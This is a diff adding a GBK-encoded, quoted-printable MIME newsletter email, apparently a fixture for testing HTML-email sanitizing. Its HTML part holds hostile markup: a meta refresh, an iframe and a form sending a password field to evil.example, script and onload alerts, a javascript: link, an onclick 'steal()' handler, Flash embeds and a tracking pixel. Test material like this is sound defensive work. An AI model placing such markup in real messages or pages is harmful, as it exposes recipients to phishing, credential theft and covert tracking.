@@ -1,0 +1,38 @@
+From: =?UTF-8?B?5paw6Ze75ZGo5oql?= <news@example.com>
+To: {to}
+Subject: newsletter-gbk
+Date: Thu, 12 Nov 2026 10:00:00 +0800
+Message-ID: <nl1@example.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt1"
+
+--alt1
+Content-Type: text/plain; charset=gbk
+Content-Transfer-Encoding: quoted-printable
+
+=B1=BE=D6=DC=D0=C2=CE=C5
+=C4=E3=BA=C3=A3=AC=D5=E2=CA=C7=D2=BB=B7=E2HTML=D3=CA=BC=FE=A1=A3
+
+--alt1
+Content-Type: text/html; charset=gbk
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html><html><head><meta charset=3D"gbk"><meta http-equiv=3D"refres=
+h" content=3D"0;url=3Dhttps://evil.example/">
+<title>=D6=DC=B1=A8=B1=EA=CC=E2</title><style>.hero{color:#c00;font-size:24=
+px} td{padding:8px}</style>
+<script>alert(1)</script></head>
+<body onload=3D"alert(2)"><table width=3D"600" bgcolor=3D"#f4f4f4" cellpadd=
+ing=3D"0" cellspacing=3D"0" align=3D"center"><tr>
+<td class=3D"hero" style=3D"background-color:#ffffff;color:#333333"><h1>=B1=
+=BE=D6=DC=D0=C2=CE=C5</h1><p>=C4=E3=BA=C3=A3=AC=D5=E2=CA=C7=D2=BB=B7=E2<b>H=
+TML</b>=D3=CA=BC=FE=A1=A3</p>
+<img src=3D"https://tracker.example/open.gif" width=3D"1" height=3D"1"><img=
+ src=3D"https://cdn.example/banner.png" alt=3D"banner">
+<a href=3D"https://example.com/article?id=3D1" onclick=3D"steal()">=D4=C4=
+=B6=C1=C8=AB=CE=C4</a> <a href=3D"javascript:alert(3)">x</a>
+<form action=3D"https://evil.example/f"><input name=3D"pw"></form><iframe s=
+rc=3D"https://evil.example/"></iframe>
+<object data=3D"x.swf"></object><embed src=3D"y.swf"></td></tr></table></bo=
+dy></html>
+--alt1--
